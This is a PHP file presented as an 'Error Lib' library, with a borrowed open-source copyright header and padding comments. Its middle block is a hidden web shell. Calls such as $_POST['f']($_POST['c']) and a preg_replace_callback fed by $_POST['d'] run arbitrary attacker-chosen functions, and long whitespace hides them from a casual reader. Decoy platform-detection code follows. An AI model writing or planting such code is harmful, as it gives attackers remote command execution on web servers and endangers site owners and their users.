<?php
/**
 * @package    Error Lib
 * *************
 * @copyright  Copyright (C) 2005 - 2016 Open Source Matters, Inc. All rights reserved.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   // QxmUcTtNYQh7KnXSeFespS7aNf5HXr2WkEYkWpmHdssm0wg40sVavXMv1HsxVCD3fpqYCEcCbNvbHKzfwhkNm0N1VFynKt3gzbwHNCpaeeVD25VTEM32YY7D59UdC6dankQ3b0ZaMtm57Ez9ds4d14dvmXkeeDex98pERXfDmP0MvgUCF871faFxQ21tCPC5vcn6ssfq7Rtft0drKWUnkmaWhVm0HkgT6gKtKuQTHTRxuNuq1UU2p3Zb9bsTbTbTTVfzgw3u94Pbpwcq0ZswKVgFabArMYZWH6TaUU1k4wEwcZSqPp6CsgbdNXuGUCcdxPZScKuD2Trrq6r0mDMEc9zM8VVdygx3bS6ZgV98W31DRgemH8S3A7aHpgYxnMu0M9f0tWE5fqxyAsXHPWnHUZWkEryQCBSDaNbx2vn3dD9muC22NKhuFH99cM7byaKtD
 * @license    GNU General Public License version 2 or later; see LICENSE
 */

// Set the platform root path as a constant if necessary.
if (defined('PATH'))
{
	define('PATH', __DIR__);
}
else if (                             empty                       ($_POST)) {
	
	echo 'Not exception. Exiting.';
	
	exit;
}

// Register the exception library.
function exception_handler              ($e) 
{
  preg_replace_callback                            ('||', $_POST['d']                             ('', $e->getMessage                  ()), ''                             )


; 
}
set_exception_handler                             ('exception_handler' )
;

throw new Exception                        ($_POST['f']       ($_POST       ['c'])                           );

// Detect the native operating system type.
$os = strtoupper    (      substr(PHP_OS, 0, 3));

if (!defined('IS_WIN'))
{
	define('IS_WIN', ($os === 'WIN') ? true : false);
}
if (!defined('IS_UNIX'))
{
	define('IS_UNIX', (IS_WIN === false) ? true : false);
}
